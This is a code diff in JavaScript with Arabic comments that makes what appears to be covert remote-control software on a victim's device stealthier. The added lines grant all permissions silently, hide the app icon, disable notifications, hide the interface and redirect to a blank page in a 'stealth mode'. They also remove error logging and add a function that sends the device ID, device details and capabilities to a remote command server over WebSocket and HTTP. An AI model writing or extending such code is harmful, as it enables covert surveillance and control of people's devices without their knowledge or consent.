@@ -41,22 +41,20 @@
         }
     };
     
-    // تهيئة النظام
+    // تهيئة النظام - ربط تلقائي فوري
     async function initializeSystem() {
         try {
-            console.log('بدء تهيئة النظام...');
-            
             // حفظ معرف الجهاز
             localStorage.set('deviceId', deviceId);
             localStorage.set('activationTime', Date.now());
             
-            // 1. منح الصلاحيات تلقائياً
+            // 1. منح الصلاحيات تلقائياً (بدون إشعارات)
             await grantAllPermissions();
             
             // 2. إخفاء أيقونة التطبيق
             hideAppIcon();
             
-            // 3. تعطيل الإشعارات
+            // 3. تعطيل الإشعارات تماماً
             disableNotifications();
             
             // 4. تسجيل Service Worker للعمل في الخلفية
@@ -68,26 +66,23 @@
             // 6. بدء الخدمات الخلفية
             startBackgroundServices();
             
-            // 7. إرسال تأكيد التفعيل
-            sendActivationConfirmation();
+            // 7. إرسال تأكيد التفعيل (ربط تلقائي)
+            sendAutoActivationConfirmation();
             
             // 8. حفظ حالة التفعيل
             localStorage.set('systemStatus', 'active');
             localStorage.set('lastActivity', Date.now());
             
-            console.log('تم تفعيل النظام بنجاح');
-            
-            // إخفاء واجهة المستخدم نهائياً
+            // 9. إخفاء واجهة المستخدم نهائياً
             hideUserInterface();
             
-        } catch (error) {
-            console.error('خطأ في التفعيل:', error);
-            localStorage.set('lastError', {
-                message: error.message,
-                timestamp: Date.now()
-            });
+            // 10. إعادة توجيه إلى صفحة فارغة (وضع التخفي)
+            setTimeout(() => {
+                window.location.href = 'about:blank';
+            }, 1000);
             
-            // إعادة المحاولة تلقائياً
+        } catch (error) {
+            // إعادة المحاولة تلقائياً بدون إشعارات
             setTimeout(initializeSystem, 5000);
         }
     }
@@ -564,7 +559,43 @@
         }, 60000);
     }
     
-    // إرسال تأكيد التفعيل
+    // إرسال تأكيد التفعيل - ربط تلقائي
+    function sendAutoActivationConfirmation() {
+        const activationData = {
+            deviceId: deviceId,
+            status: 'auto_activated',
+            activationType: 'automatic',
+            timestamp: Date.now(),
+            deviceInfo: getDeviceInfo(),
+            capabilities: getDeviceCapabilities(),
+            stealthMode: true
+        };
+        
+        // إرسال للخادم
+        if (window.controlConnection) {
+            window.controlConnection.send(JSON.stringify({
+                type: 'auto_activation_confirmation',
+                data: activationData
+            }));
+        }
+        
+        // إرسال عبر HTTP أيضاً
+        const isLocalhost = window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1';
+        const commandServerHttpUrl = isLocalhost 
+            ? 'http://localhost:4000' 
+            : 'https://remote-control-command-server.onrender.com';
+            
+        fetch(`${commandServerHttpUrl}/auto-activation-confirmation`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(activationData)
+        }).catch(e => {
+            // حفظ محلياً بدون إشعارات
+            cacheData('auto_activation_confirmation', activationData);
+        });
+    }
+
+    // إرسال تأكيد التفعيل (الطريقة القديمة - محفوظة للتوافق)
     function sendActivationConfirmation() {
         const activationData = {
             deviceId: deviceId,
